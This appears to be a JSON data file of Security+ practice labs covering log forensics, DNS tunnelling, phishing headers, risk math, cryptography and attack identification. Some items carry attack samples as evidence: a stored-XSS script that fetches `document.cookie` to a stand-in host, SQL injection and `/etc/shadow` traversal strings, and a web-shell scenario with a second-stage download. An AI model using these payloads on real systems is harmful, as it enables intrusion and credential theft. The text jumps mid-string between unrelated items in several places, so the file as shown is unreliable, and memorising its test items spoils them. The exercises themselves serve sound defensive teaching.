og<\/code>: who did it, how they got in, and what they ran.","why":"<ul><li><code>awk '{print $1}' access.log | sort | uniq -c | sort -nr<\/code> ranks the clients; one address stands out and its requests look nothing like browsing.<\/li><li>Its first requests carry a <strong>sqlmap<\/strong> User-Agent and SQL injection payloads (<code>%27<\/code> is an encoded quote, then <code>UNION SELECT<\/code> pulling usernames and passwords).<\/li><li>With stolen credentials it logs into <code>/admin/<\/code> and uploads a PHP file to a folder meant for PDFs: a <strong>web shell<\/strong>.<\/li><li>Requests with <code>?cmd=<\/code> are commands run on the server: <code>id<\/code> to check privileges, then a download and execution of a second-stage script, which explains the new outbound traffic.<\/li><li>Fixes: parameterized queries, validate upload type and store uploads where scripts cannot execute, and a WAF in front.<\/li><\/ul>","objText":"Obj 4.9 – Log data to support an investigation | Obj 2.4 – Application attacks: injection, directory traversal","tip":"Find the noisy address first, then read only its lines in order: <code>grep ADDRESS access.log<\/code>.","label":"Investigate, then submit your findings","tasks":[{"q":"Which IP address carried out the attack?","hint":"awk '{print $1}' access.log | sort | uniq -c | sort -nr"},{"q":"Which automated tool did it use first? (name from the User-Agent)","hint":"grep -i sqlmap access.log | head -3"},{"q":"What is the file name of the web shell it uploaded?","hint":"grep uploads access.log"},{"q":"What was the first command run through the web shell?","hint":"Look at the cmd= parameter on the first request to the shell."}],"files":{"/var/log/nginx/access.log":"192.0.2.55 - - [14/Nov/2026:09:02:25 +0000] \"GET /index.php HTTP/1.1\" 200 3830 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0\"\n192.0.2.14 - - [14/Nov/2026:09:02:29 +0000] \"GET /img/logo.png HTTP/1.1\" 200 6393 \"-\" \"Mozilla/5.0 (Windows NT 10.0; W 02 web-storefront:<\/strong> 250,000 × 0.2 × 3 = <strong>$150,000<\/strong> (transfer)<\/li><li><strong>R-103 laptop-fleet:<\/strong> 2,000 × 1.0 × 12 = <strong>$24,000<\/strong> (mitigate)<\/li><li><strong>R-104 payroll-saas:<\/strong> 400,000 × 0.3 × 0.5 = <strong>$60,000<\/strong> (transfer)<\/li><li><strong>R-105 legacy-erp:<\/strong> 600,000 × 0.4 × 0.5 = <strong>$120,000<\/strong> (accept)<\/li><li><strong>R-106 office-wifi:<\/strong> 50,000 × 0.1 × 1 = <strong>$5,000<\/strong> (accept)<\/li><li>The biggest annual exposure is not the most valuable asset: a small loss that happens often can outweigh a large one that is rare.<\/li><li>A risk with no owner is a risk nobody is managing.<\/li><li>Accepting a risk above the board's appetite needs a formal exception or a different treatment.<\/li><\/ul>","objText":"Obj 5.2 – Risk management: risk register, risk appetite, SLE, ALE, ARO","tip":"<code>cut -d, -f1,2,4,5,6 risk_register.csv<\/code> shows only the columns you need for the math.","label":"Investigate, then submit your findings","tasks":[{"q":"Which asset has the highest ALE? (asset name)","hint":"Compute asset_value * exposure_factor * aro for each row."},{"q":"What is that ALE in dollars? (digits only)","hint":"calc 250000*0.2*3"},{"q":"Which risk ID has no owner assigned?","hint":"cut -d, -f1,7 risk_register.csv"},{"q":"Which risk ID is marked <em>accept<\/em> but exceeds the appetite?","hint":"grep accept risk_register.csv, then compute each ALE."}],"files":{"/home/analyst/grc/risk_register.csv":"id,asset,threat,asset_value,exposure_factor,aro,owner,treatment\nR-101,customer-db,ransomware,900000,0.50,0.2,CISO,mitigate\nR-102,web-storefront,ddos outage,250000,0.20,3,IT Ops,transfer\nR-103,laptop-fleet,device theft,2000,1.00,12,IT Ops,mitigate\nR-104,payroll-saas,vendor breach,400000,0.30,0.5,,transfer\nR-105,legacy-erp,unpatched exploit,600000,0.40,0.5,CFO,accept\nR-106,office-wifi,rogue access point,50000,0.10,1,IT Ops,accept\n","/home/analyst/grc/risk_appetite.txt":"RISK APPETITE STATEMENT (board approved)\n- Any single risk with an ALE above 50000 must be mitigated, transferred or avoided.\n- Risks may only be ACCEPTED at or below that level, with a named owner.\n- Every risk must have a named owner.\n"},"meta":{},"cmds":{},"deny":{},"host":"grc01","user":"analyst","cwd":"/home/analyst/grc","map":{"nodes":[{"id":"r","label":"risk_register.csv","icon":"📊","x":14,"y":50,"task":null,"sub":""},{"id":"top","label":"Highest-ALE asset","icon":"🔥","x":50,"y":16,"task":0,"sub":""},{"id":"ale","label":"ALE ($)","icon":"$","x":86,"y":16,"task":1,"sub":""},{"id":"own","label":"No owner","icon":"❓","x":50,"y":84,"task":2,"sub":""},{"id":"over","label":"Over appetite","icon":"⛔","x":86,"y":84,"task":3,"sub":""}],"links":[["r","top","",0],["top","ale","SLE × ARO",1],["r","own","",2],["r","over","accept?",3]]},"parts":4,"pass":4},{"id":"term-dns","domain":4,"diff":3,"obj":"4.9 / 2.4","type":"terminal","name":"Data Leaving by DNS","scenario":"The firewall blocks almost all outbound traffic, yet DLP suspects data is leaving. DNS is always allowed out. Look for a tunnel in <code>/var/log/named/query.log<\/code>, then use <code>~/dhcp_leases.csv<\/code> to name the machine.","why":"<ul><li><code>awk '{print $4}' query.log | cut -d# -f1 | sort | uniq -c | sort -nr | chart<\/code> shows one client far ahead of the rest.<\/li><li><code>grep 10.0.9.37 query.log<\/code> shows long random labels in front of one domain, all <strong>TXT<\/strong> lookups. Normal clients ask for a handful of readable names with A or AAAA records.<\/li><li>Each label is a chunk of encoded data: the attacker's name server for that domain receives it. That is <strong>DNS tunnelling / exfiltration<\/strong>.<\/li><li>The DHCP lease file turns the address into a machine and a user so the endpoint can be isolated.<\/li><li>Defences: DNS filtering, alerting on query length and volume per client, and forcing clients through an inspected resolver.<\/li><\/ul>","objTe 0.0.9.12,00:16:3e:11:a0:01,HR-PC-003,dlee\n10.0.9.18,00:16:3e:11:a0:02,ENG-WS-021,pnguyen\n10.0.9.37,00:16:3e:11:a0:03,FIN-LT-014,rgarcia\n10.0.9.44,00:16:3e:11:a0:04,MKT-PC-009,sbrown\n10.0.9.61,00:16:3e:11:a0:05,ENG-WS-030,tkim\n"},"meta":{},"cmds":{},"deny":{},"host":"dns01","user":"analyst","cwd":"/var/log/named","map":{"nodes":[{"id":"c","label":"Noisy client","icon":"💻","x":12,"y":40,"task":0,"sub":""},{"id":"hn","label":"Hostname","icon":"🏷","x":12,"y":86,"task":3,"sub":""},{"id":"res","label":"dns01 resolver","icon":"🧭","x":46,"y":40,"task":null,"sub":""},{"id":"ty","label":"Record type","icon":"✉","x":46,"y":8,"task":2,"sub":""},{"id":"dom","label":"Tunnel domain","icon":"🕳","x":86,"y":40,"task":1,"sub":""}],"links":[["c","res","queries",0],["res","dom","forwards",1],["res","ty","",2],["c","hn","",3]]},"parts":4,"pass":4},{"id":"term-phish","domain":2,"diff":2,"obj":"2.2 / 4.5","type":"terminal","name":"Dissect the Phish","scenario":"An employee reported a password-expiry email. The original message is saved as <code>message.eml<\/code>. Read the headers, not the display name, and decide whether it is real.","why":"<ul><li>The top <code>Received:<\/code> header shows the message came from a bulk mailer, not from the company's own servers.<\/li><li><strong>SPF fail, no DKIM, DMARC fail<\/strong>: the sender is not authorised to use the company domain. It was still delivered because DMARC is set to <code>action=none<\/code>.<\/li><li><strong>Reply-To<\/strong> points at a look-alike domain with a digit 1 in place of the letter l (typosquatting).<\/li><li>The link text shows the real site, but the <code>href<\/code> goes to a different host that merely starts with the company name.<\/li><li>Urgency plus authority is the social-engineering hook. Response: block the sender and URL, search for other recipients, and check whether the user entered credentials.<\/li><\/ul>","objText":"Obj 2.2 – Threat vectors: phishing, impersonation, typosquatting | Obj 4.5 – Email security","tip":"Read <code>Received:<\/code> headers from the top: the first one was added by <em>your<\/em> mail server, so it is the one you can trust.","label":"Investigate, then submit your findings","tasks":[{"q":"Which IP address delivered the message to your mail server?","hint":"grep -A1 '^Received' message.eml | head -3   (or just: head -4 message.eml)"},{"q":"What was the SPF result?","hint":"grep -i spf message.eml"},{"q":"Replies would go to which domain?","hint":"grep -i reply-to message.eml"},{"q":"Which host does the link really open? (hostname only)","hint":"grep href message.eml"}],"files":{"/home/analyst/case-4471/message.eml":"Return-Path: <bounce@mailer.bulk-send.example>\nReceived: from mailer.bulk-send.example (mailer.bulk-send.example [198.51.100.201])\n        by mx1.corp-example.com with ESMTPS id 4Xk2Lq0c7z\n        for <rgarcia@corp-example.com>; Sat, 14 Nov 2026 08:02:11 +0000\nReceived: from [10.44.2.9] (unknown [10.44.2.9])\n        by mailer.bulk-send.example with ESMTP; Sat, 14 Nov 2026 08:02:09 +0000\nAuthentication-Results: mx1.corp-example.com;\n        spf=fail (sender IP is 198.51.100.201) smtp.mailfrom=corp-example.com;\n        dkim=none; dmarc=fail action=none header.from=corp-example.com\nFrom: \"IT Service Desk\" <helpdesk@corp-example.com>\nReply-To: it-support@corp-examp1e.net\nTo: rgarcia@corp-example.com\nSubject: [URGENT] Your password expires in 2 hours\nDate: Sat, 14 Nov 2026 08:02:08 +0000\nMessage-ID: <20261114080208.1F3A@mailer.bulk-send.example>\nX-Mailer: BulkSend Pro 6.1\nContent-Type: text/html; charset=UTF-8\n\n<p>Dear user,<\/p>\n<p>Your network password expires today. To avoid losing access you must\nconfirm your account within 2 hours.<\/p>\n<p><a href=\"https://corp-example.login-portal.example/reset?u=rgarcia\">https://corp-example.com/password-reset<\/a><\/p>\n<p>IT Service Desk<\/p>\n","/home/analyst/case-4471/ticket.txt":"Ticket 4471: user rgarcia (Finance) forwarded a 'password expires' email. Did not click, so they say.\nCompany mail domain: corp-example.com\n"},"meta":{},"cmds":{},"deny":{},"host":"soc-ws07","user":"analyst","cwd":"/home/analyst/case-4471","map":{"nodes":[{"id":"s","label":"Sending server","icon":"📤","x":12,"y":40,"task":0,"sub":""},{"id":"mx","label":"mx1.corp-example.com","icon":"📮","x":48,"y":40,"task":null,"sub":""},{"id":"u","label":"rgarcia inbox","icon":"👤","x":86,"y":40,"task":null,"sub":""},{"id":"spf","label":"SPF result","icon":"🛡","x":48,"y":8,"task":1,"sub":""},{"id":"rt","label":"Reply-To domain","icon":"↩","x":12,"y":88,"task":2,"sub":""},{"id":"l","label":"Link really opens","icon":"🔗","x":86,"y":88,"task":3,"sub":""}],"links":[["s","mx","delivers",0],["mx","u","",null],["mx","spf","checks",1],["u","rt","reply",2],["u","l","click",3]]},"parts":4,"pass":4},{"id":"pbq-crypto-keys","domain":1,"diff":3,"obj":"1.4","type":"selects","name":"Cryptography in Practice — Technique and Key","scenario":"Bob runs a small firm that trades contracts with Alice and a bank. For each task, pick the <strong>technique<\/strong> and the exact <strong>key<\/strong> involved. Both must be right for the row to count. \"Sender\" and \"recipient\" are the people named in that row.","label":"Pick technique and key for each task","objText":"Obj 1.4 – Explain the importance of using appropriate cryptographic solutions","why":"<ul><li><strong>Row 1:<\/strong> Bob proves the contract came from him and was not changed: a <strong>digital signature<\/strong> made with the <strong>sender's (Bob's) private key<\/strong>. This is what gives non-repudiation.<\/li><li><strong>Row 2:<\/strong> the bank checks Bob's signature with <strong>Bob's public key<\/strong> (the sender's public key).<\/li><li><strong>Row 3:<\/strong> only Bob should read Alice's file, so Alice uses <strong>asymmetric encryption<\/strong> with the <strong>recipient's (Bob's) public key<\/strong>.<\/li><li><strong>Row 4:<\/strong> Bob opens it with his own <strong>private key<\/strong> (the recipient's private key).<\/li><li><strong>Row 5:<\/strong> a 2 TB nightly backup needs speed: <strong>symmetric encryption<\/strong> (AES) with a <strong>shared secret key<\/strong>. Asymmetric is far too slow for bulk data.<\/li><li><strong>Row 6:<\/strong> comparing an ISO to the vendor's published SHA-256 value is <strong>hashing<\/strong>. A plain hash uses <strong>no key<\/strong>.<\/li><li><strong>Row 7:<\/strong> replacing card numbers with surrogates that map back only through a vault is <strong>tokenization<\/strong>. There is no mathematical key: the mapping lives in the vault.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> Bob sends the bank a signed contract so the bank can prove Bob approved it and that it was not altered.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>2.<\/strong> The bank checks that the contract really came from Bob.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>3.<\/strong> Alice sends Bob a short file that only Bob must be able to read.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>4.<\/strong> Bob opens the file Alice sent him in row 3.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>5.<\/strong> A 2 TB nightly backup must be encrypted before it is copied offsite, as fast as possible.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>6.<\/strong> A technician compares a downloaded ISO with the SHA-256 value on the vendor's site.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]},{"d":"<strong>7.<\/strong> Card numbers in the analytics database are replaced with random surrogates; the real numbers can only be looked up in a secured vault.","f":[{"ph":"Technique","o":["Symmetric encryption","Asymmetric encryption","Hashing","Digital signature","Tokenization","Key stretching"]},{"ph":"Key","o":["Sender's private key","Sender's public key","Recipient's public key","Recipient's private key","Shared secret key","No key is used"]}]}],"parts":7,"pass":6},{"id":"pbq-change-mgmt","domain":1,"diff":3,"obj":"1.3","type":"zones","name":"Change Management — Business, Technical or Documentation?","scenario":"A firewall and EDR upgrade is going to the change advisory board next week. Sort each item from the change ticket into the part of change management it belongs to. <strong>Tap an item, then tap a box.<\/strong> Tap a placed item to move it.","label":"Place all ten items","objText":"Obj 1.3 – Explain the importance of change management processes and the impact to security","zones":["Business process","Technical implication","Documentation & version control"],"items":["The CAB must sign off before any work starts","The new EDR agent must be added to the application allow list or it will be blocked","If the upgrade fails, roll back to the saved firmware image","Updated network diagrams showing the new firewall","Work is only permitted Sunday 01:00–04:00","The VPN service must restart, so remote users drop for about two minutes","A 15-year-old payroll app only runs with the old TLS settings","The firewall config is committed to Git with a change description","The VP of Infrastructure is named as owner of the change","The SIEM collector depends on the firewall's syslog format, which is changing"],"why":"<ul><li><strong>Business process:<\/strong> approval (CAB sign-off), backout plan (roll back to the saved image), maintenance window (Sunday 01:00–04:00) and ownership (named owner).<\/li><li><strong>Technical implication:<\/strong> allow lists, service restarts and downtime, legacy applications and dependencies (the SIEM relies on the syslog format).<\/li><li><strong>Documentation &amp; version control:<\/strong> updated diagrams and the config committed to Git.<\/li><li>Trap: the backout plan sounds technical, but CompTIA lists it with the business processes that get a change approved.<\/li><\/ul>","parts":10,"pass":8},{"id":"pbq-physical-deception","domain":1,"diff":2,"obj":"1.2","type":"match","name":"Physical Security & Deception — Pick the Control","scenario":"Facilities and the SOC each have a problem to solve. Match each control to the requirement it meets best. <strong>Tap a control, then tap its requirement.<\/strong> Tap a paired control to undo it.","label":"Pair all six","objText":"Obj 1.2 – Physical security and deception and disruption technology","cols":["Control","Requirement"],"lefts":["Bollards","Access control vestibule","Honeyfile","Honeynet","Infrared sensor","Pressure sensor"],"rights":["Raise an alert when anyone opens a file called passwords.xlsx left on the finance share.","Detect a person's body heat moving through a dark corridor after hours.","Stop a vehicle from being driven through the glass front of the lobby.","Trigger when someone steps on the floor inside the server cage.","Only one door can be open at a time, so a tailgater is trapped between them.","Study attacker tools by luring them into a separate subnet of fake servers and workstations."],"why":"<ul><li><strong>Bollards<\/strong> stop vehicles. <strong>Access control vestibule<\/strong> (mantrap) defeats tailgating and piggybacking.<\/li><li><strong>Honeyfile<\/strong> is one bait file: any access is suspicious. A <strong>honeynet<\/strong> is a set of decoy systems used to observe attackers.<\/li><li><strong>Infrared<\/strong> detects heat. <strong>Pressure<\/strong> sensors detect weight on a surface.<\/li><\/ul>","parts":6,"pass":5},{"id":"pbq-attack-evidence","domain":2,"diff":3,"obj":"2.4","type":"selects","name":"Name the Attack from the Evidence","scenario":"The SOC has pulled one piece of evidence for each open incident. Identify the attack each one shows.","label":"Identify each attack","objText":"Obj 2.4 – Given a scenario, analyze indicators of malicious activity","why":"<ul><li><strong>1 Password spraying:<\/strong> one common password tried once against thousands of accounts stays under lockout thresholds.<\/li><li><strong>2 Brute force:<\/strong> thousands of guesses against one account.<\/li><li><strong>3 Directory traversal:<\/strong> <code>../<\/code> sequences climb out of the web root.<\/li><li><strong>4 Cross-site scripting:<\/strong> a stored script runs in other users' browsers and steals their cookies.<\/li><li><strong>5 Reflected/amplified DDoS:<\/strong> small queries with the victim's spoofed address make open resolvers flood the victim with large replies.<\/li><li><strong>6 Replay:<\/strong> a captured, valid authentication message is resent and accepted. Fix with nonces and timestamps.<\/li><li><strong>7 SQL injection:<\/strong> <code>' OR 1=1 --<\/code> changes the query logic.<\/li><li><strong>8 Privilege escalation:<\/strong> a low-privilege process gets root through a kernel bug.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> <code>auth.log<\/code>: 4,812 different accounts each had exactly one failed login for <code>Winter2026!<\/code> from 45.9.20.11 in ten minutes.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>2.<\/strong> <code>auth.log<\/code>: the account <code>cfo<\/code> had 38,000 failed logins in two hours, each with a different password.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>3.<\/strong> <code>access.log<\/code>: <code>GET /download.php?file=../../../../etc/shadow 200<\/code>","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>4.<\/strong> A product review saved as <code>&lt;script&gt;fetch('//x.example/?c='+document.cookie)&lt;/script&gt;<\/code> runs whenever an admin opens the moderation page.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>5.<\/strong> 300 open DNS resolvers suddenly send 4,000-byte answers to your web server, which never asked them anything.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>6.<\/strong> An attacker captured a valid signed login message from a smart lock's app and sent the exact same message 20 minutes later. The door opened.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>7.<\/strong> The username field of the login form contains <code>admin' OR 1=1 --<\/code> and the attacker is logged in as the first user in the table.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]},{"d":"<strong>8.<\/strong> A web shell running as <code>www-data<\/code> runs a kernel exploit and the next command shows <code>uid=0(root)<\/code>.","f":[{"ph":"Attack","o":["Password spraying","Brute force","SQL injection","Cross-site scripting","Directory traversal","Replay","On-path","Reflected / amplified DDoS","Privilege escalation","Downgrade"]}]}],"parts":8,"pass":7},{"id":"pbq-mitigations","domain":2,"diff":3,"obj":"2.5","type":"match","name":"Mitigation Techniques — Fix the Finding","scenario":"An audit left eight findings. Match each finding to the mitigation technique that addresses it most directly. <strong>Tap a finding, then tap its mitigation.<\/strong>","label":"Pair all eight","objText":"Obj 2.5 – Explain the purpose of mitigation techniques used to secure the enterprise","cols":["Finding","Mitigation"],"lefts":["An end-of-life HVAC controller can't be patched but must keep talking to the building management server","A laptop is beaconing to a ransomware command server right now","Kiosk PCs should only ever run the point-of-sale application","New switches still accept admin / admin","An old file server nobody uses is still powered on and holds customer data","Interns were given Domain Admin rights 'just in case'","The vendor released a fix for a remote code execution bug in the VPN","Admins keep weakening the server baseline, and nobody notices for months"],"rights":["Least privilege","Configuration enforcement","Isolation","Change default passwords","Segmentation","Patching","Application allow list","Decommissioning"],"why":"<ul><li><strong>Segmentation:<\/strong> the unpatchable HVAC stays online but on its own restricted VLAN.<\/li><li><strong>Isolation:<\/strong> cut the infected laptop off the network immediately so it can't spread.<\/li><li><strong>Application allow list:<\/strong> only approved programs run on the kiosk.<\/li><li><strong>Change default passwords<\/strong> (hardening) on new devices.<\/li><li><strong>Decommissioning:<\/strong> retire the unused server and sanitize its data.<\/li><li><strong>Least privilege<\/strong> for the interns.<\/li><li><strong>Patching<\/strong> the VPN.<\/li><li><strong>Configuration enforcement<\/strong> (e.g. Group Policy, DSC) re-applies the baseline automatically.<\/li><\/ul>","parts":8,"pass":7},{"id":"pbq-threat-actors","domain":2,"diff":2,"obj":"2.1","type":"selects","name":"Threat Actors & Motivations","scenario":"Threat intel sent six incident summaries. For each one, pick the <strong>threat actor<\/strong> and its most likely <strong>motivation<\/strong>. Both must be right.","label":"Classify each incident","objText":"Obj 2.1 – Compare and contrast common threat actors and motivations","why":"<ul><li><strong>1:<\/strong> a state-funded group hiding for 14 months to copy designs is a <strong>nation-state<\/strong> doing <strong>espionage<\/strong>.<\/li><li><strong>2:<\/strong> ransomware for a large payment is <strong>organized crime<\/strong> after <strong>financial gain<\/strong>.<\/li><li><strong>3:<\/strong> a fired admin wiping backups is an <strong>insider threat<\/strong> driven by <strong>revenge<\/strong>.<\/li><li><strong>4:<\/strong> attacking during a protest is a <strong>hacktivist<\/strong> acting on <strong>political beliefs<\/strong>.<\/li><li><strong>5:<\/strong> a teenager running a downloaded kit is an <strong>unskilled attacker<\/strong> seeking <strong>disruption/chaos<\/strong>.<\/li><li><strong>6:<\/strong> destroying another country's grid controllers during an armed conflict is a <strong>nation-state<\/strong> act of <strong>war<\/strong>.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> A government-funded group stayed hidden in a defense contractor's network for 14 months, quietly copying weapon designs.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]},{"d":"<strong>2.<\/strong> A ransomware crew encrypted a hospital and demanded $4 million in cryptocurrency.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]},{"d":"<strong>3.<\/strong> A system administrator deleted every backup on the night they were fired.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]},{"d":"<strong>4.<\/strong> A group took an oil company's website offline during a climate protest and posted a manifesto.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]},{"d":"<strong>5.<\/strong> A teenager ran an exploit kit downloaded from a forum against random IP addresses to impress friends.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]},{"d":"<strong>6.<\/strong> During an armed conflict, malware wiped the controllers of another country's power grid.","f":[{"ph":"Actor","o":["Nation-state","Organized crime","Hacktivist","Insider threat","Unskilled attacker","Shadow IT"]},{"ph":"Motivation","o":["Financial gain","War","Philosophical / political beliefs","Espionage","Revenge","Disruption / chaos"]}]}],"parts":6,"pass":5},{"id":"pbq-shared-resp","domain":3,"diff":3,"obj":"3.1","type":"selects","name":"Shared Responsibility — IaaS vs PaaS vs SaaS","scenario":"Your company runs three workloads: VMs on an <strong>IaaS<\/strong> platform, an app on a <strong>PaaS<\/strong> platform, and email on a <strong>SaaS<\/strong> service. For each task, choose who is responsible in each model. All three must be right for the row to count.","label":"Choose the owner in each model","objText":"Obj 3.1 – Compare and contrast security implications of different architecture models","why":"<ul><li><strong>Physical data center security:<\/strong> always the provider.<\/li><li><strong>Guest OS patching:<\/strong> customer in IaaS (you run the VM); provider in PaaS and SaaS.<\/li><li><strong>Runtime / database engine:<\/strong> customer in IaaS; provider in PaaS and SaaS.<\/li><li><strong>Application code:<\/strong> customer in IaaS and PaaS (you deploy your code); provider in SaaS (it's their application).<\/li><li><strong>User accounts and permissions<\/strong> and <strong>classifying and protecting the data:<\/strong> always the customer, in every model.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> Physical security of the data center.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]},{"d":"<strong>2.<\/strong> Patching the operating system the workload runs on.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]},{"d":"<strong>3.<\/strong> Installing and patching the runtime and database engine.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]},{"d":"<strong>4.<\/strong> Securing the application code.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]},{"d":"<strong>5.<\/strong> Creating user accounts and granting permissions.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]},{"d":"<strong>6.<\/strong> Classifying the data and deciding how it is protected.","f":[{"ph":"IaaS","o":["Customer","Cloud provider"]},{"ph":"PaaS","o":["Customer","Cloud provider"]},{"ph":"SaaS","o":["Customer","Cloud provider"]}]}],"parts":6,"pass":5},{"id":"pbq-appliances","domain":3,"diff":3,"obj":"3.2","type":"selects","name":"Secure Infrastructure — Appliances, Failure Modes, Port Security","scenario":"You are designing a new data center network. Choose the right appliance, failure mode or port-security control for each requirement.","label":"Answer all eight","objText":"Obj 3.2 – Given a scenario, apply security principles to secure enterprise infrastructure","why":"<ul><li><strong>1 WAF:<\/strong> inspects HTTP and blocks SQLi/XSS aimed at a web app.<\/li><li><strong>2 Load balancer:<\/strong> spreads traffic across servers and removes failed ones using health checks.<\/li><li><strong>3 Forward proxy:<\/strong> sits between internal users and the internet for URL filtering and caching. (A reverse proxy fronts your own servers.)<\/li><li><strong>4 Jump server:<\/strong> the single hardened host admins pass through to reach a protected zone.<\/li><li><strong>5 IDS:<\/strong> a passive sensor on a TAP or SPAN port can alert but cannot block.<\/li><li><strong>6 Fail-open:<\/strong> patient monitoring must keep flowing even if the IPS dies.<\/li><li><strong>7 Fail-closed:<\/strong> for cardholder data, losing protection is worse than losing access.<\/li><li><strong>8 802.1X:<\/strong> port-based network access control that authenticates the device through EAP and RADIUS before the port passes traffic. MAC filtering is easily spoofed.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> Inspect inbound HTTP to the customer portal and block SQL injection and XSS payloads.","f":[{"ph":"Device","o":["WAF","IPS","IDS","Load balancer","Forward proxy","Reverse proxy","Jump server","UTM"]}]},{"d":"<strong>2.<\/strong> Spread traffic across six web servers and stop sending requests to any server that fails a health check.","f":[{"ph":"Device","o":["WAF","IPS","IDS","Load balancer","Forward proxy","Reverse proxy","Jump server","UTM"]}]},{"d":"<strong>3.<\/strong> Employees' outbound web requests must pass through one device for URL filtering and caching.","f":[{"ph":"Device","o":["WAF","IPS","IDS","Load balancer","Forward proxy","Reverse proxy","Jump server","UTM"]}]},{"d":"<strong>4.<\/strong> Administrators must first log into one hardened host, then connect from it to the server VLAN.","f":[{"ph":"Device","o":["WAF","IPS","IDS","Load balancer","Forward proxy","Reverse proxy","Jump server","UTM"]}]},{"d":"<strong>5.<\/strong> A sensor on a SPAN port must alert analysts but must never be able to drop production traffic.","f":[{"ph":"Device","o":["WAF","IPS","IDS","Load balancer","Forward proxy","Reverse proxy","Jump server","UTM"]}]},{"d":"<strong>6.<\/strong> An inline IPS protects the ICU patient-monitoring network. If the IPS crashes, what should it do?","f":[{"ph":"Failure mode","o":["Fail-open","Fail-closed"]}]},{"d":"<strong>7.<\/strong> A firewall protects the cardholder data environment. If it crashes, what should it do?","f":[{"ph":"Failure mode","o":["Fail-open","Fail-closed"]}]},{"d":"<strong>8.<\/strong> A switch port must authenticate the connecting device through EAP and a RADIUS server before passing any traffic.","f":[{"ph":"Port security","o":["802.1X","MAC filtering","Port mirroring","VLAN 